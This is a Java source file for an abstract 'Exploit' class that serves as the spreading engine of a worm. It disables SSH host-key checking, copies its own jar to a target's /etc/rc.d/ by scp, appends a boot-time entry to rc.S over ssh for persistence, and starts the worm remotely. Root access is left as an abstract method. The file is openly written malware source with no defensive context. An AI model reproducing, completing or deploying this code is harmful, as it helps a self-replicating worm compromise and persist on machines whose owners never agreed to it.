

public abstract class Exploit {
	
	String dusr;
	String file;
	String ip;
	
	public Exploit(String user, String filepath, String IP){
		ip = IP;
		file = filepath;
		dusr = user;
	}
	
	abstract protected boolean getRootAccess();
	
	private boolean copyToTarget(){
		
		Runtime runner = Runtime.getRuntime();
		
		String[] cmd = new String[]{"scp", "-o StrictHostKeyChecking=no", file, dusr+"@"+ip+":/etc/rc.d/"};
		
		Process proc;
		
		try{
			 proc = runner.exec(cmd);
			 proc.waitFor();
			 
		}catch(Exception e){
			return false;
		}
		
		try{
			Thread.sleep(5000);
			proc.destroy();
		}catch(Exception e){
			return false;
		}
		
		
		return true;
	}
	
	protected String getFName(){
		String[] fileName = file.split("/");
		String fname;
		
		if(fileName.length == 0)
			fname = file;
		else if(fileName[fileName.length-1] == "" || fileName[fileName.length-1] == null)
			fname = fileName[fileName.length -2];
		else
			fname = fileName[fileName.length - 1];
		
		return fname;
	}
	
	
	private boolean begin(){
		Runtime runner = Runtime.getRuntime();
		
		
		Process proc;
	
		
		try{
			String fname = getFName();
			String runAtBootTime = "echo java -jar /etc/rc.d/" + fname + " >> /etc/rc.d/rc.S";
			String[] cmd = new String[]{"/usr/bin/ssh", dusr+"@"+ip, runAtBootTime};
				
			proc = runner.exec(cmd);
			proc.waitFor();
			
			String runWorm = "/etc/rc.d/" + fname;
			cmd = new String[]{"/usr/bin/ssh", dusr+"@"+ip, runWorm};
			
			proc = runner.exec(cmd);
			proc.waitFor();
			
			
		}catch(Exception e){
			return false;
		}
		
		try{
			Thread.sleep(5000);
			proc.destroy();
		}catch(Exception e){
			return false;
		}
		
		
		return true;
	}
	
	public boolean exploit(){

		//gain root access (and edit the config to run this at boot time)
		if(!getRootAccess()){
			System.err.println("failed to gain root access");
			return false;
		}
		
		//copy itself to the target
		if(!copyToTarget()){
			System.err.println("failed to copy self to the target");
			return false;
		}
		
		if(!begin()){
			System.err.println("failed to start worm");
			return false;
		}
		
		return true;
	}
}
